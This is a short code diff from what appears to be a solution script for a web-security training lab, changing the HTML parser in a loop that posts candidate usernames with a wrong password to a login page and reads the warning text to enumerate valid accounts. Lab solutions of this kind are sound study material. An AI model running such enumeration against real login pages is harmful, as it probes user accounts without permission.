@@ -19,7 +19,7 @@ def solve_lab(session):
     for user in usernames:
         data = {"username": user, "password": "IncorrectPassword"}
         resp = session.post_path("/login", data=data)
-        soup = BeautifulSoup(resp.text, "html.parser")
+        soup = BeautifulSoup(resp.text, "lxml")
         query = soup.select_one("p.is-warning")
 
         if query is None:
